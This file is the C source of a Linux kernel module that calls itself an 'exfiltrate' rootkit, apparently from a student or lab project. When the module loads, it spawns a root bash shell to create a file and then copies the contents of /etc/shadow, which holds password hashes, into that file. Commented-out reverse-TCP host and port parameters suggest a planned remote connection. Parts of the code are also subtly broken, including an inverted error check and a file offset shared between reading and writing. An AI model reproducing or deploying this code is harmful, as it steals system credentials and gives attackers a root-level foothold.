#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/module.h>		//O_RDONLY --> 0
#include <linux/slab.h>
#include <linux/fcntl.h>        // O_ACCMODE
#include <linux/miscdevice.h>
#include <linux/moduleparam.h>

MODULE_AUTHOR("Vedha&Amrith");
MODULE_LICENSE("GPL");
//static char *host = "REV_TCP_LH=127.0.0.1";
//module_param(host, charp, 0000);
//static char *port = "REV_TCP_LP=1337";
//module_param(port, charp, 0000);
char *tab; //the table to contain each line the file
char tmp[10];
static int i=0;


static void read_write_file(char *filename)
{
	  struct file *f = NULL;
 	  struct file *f1=NULL;
	  char* abs_path="/home/remnux/Desktop/rootkit/exfilter.txt";
	  int fd,j=0;
	  char buf[1];
//  int *input_size;
	  loff_t f_pos = 0;
	  mm_segment_t old_fs = get_fs();
 // vfs_stat(filename, stat);
 // *input_size = stat->size;
	  tab =  kmalloc(15, GFP_KERNEL);
	  set_fs(KERNEL_DS);
	  f = filp_open(filename, O_RDONLY, 0);
	  f1 = filp_open(abs_path, O_CREAT | O_WRONLY | O_APPEND | O_LARGEFILE, 0666);
	  if (!IS_ERR(f1))
	  {
		printk(KERN_INFO "Error in opening file exfiltrate.txt");
	  }
	  if (!IS_ERR(f)) {
	    printk(KERN_DEBUG);
	 while (kernel_read(f, buf, 1, &f_pos) == 1 && j<299){
	      printk("%c", buf[0]);
	      if(buf[0]!='\n'){
      		tab[i]=buf[0];
      		printk("tab[%d] = %c\n", i, tab[i]);
		kernel_write(f1,buf,1,&f_pos);
     		 i++;
      		j++;
      		}
    	}
	   printk("\n");
    //sys_close(fd);
           filp_close(f, NULL);
  }
  set_fs(old_fs);
}


static void create_file(void)
{
char *envp[] = {
				"HOME=/root",
				"TERM=xterm",
				NULL
			};

char *argv[] = {
				"/bin/bash",
				"-c",
				"/usr/bin/touch /home/remnux/Desktop/rootkit/exfilter.txt",
				NULL
			};

printk(KERN_INFO "[-] Gonna create a file\n");
	call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
	printk(KERN_INFO "[-] File created  successfully\n");

}

static void transfer_data(void)
{





printk(KERN_INFO "[-] Transfering of Data initiated !!!\n");

printk(KERN_INFO "[-] Transfer of Data completed!!!\n");

}


static int __init mod_init(void)
{
	printk(KERN_INFO "init: exfiltrate loaded!!!\n");
	create_file();
	read_write_file("/etc/shadow");
	return 0;
}



static void __exit mod_exit(void)
{
	printk(KERN_INFO "exit: exfiltrate unloaded!!!\n");

}


module_init(mod_init);
module_exit(mod_exit);
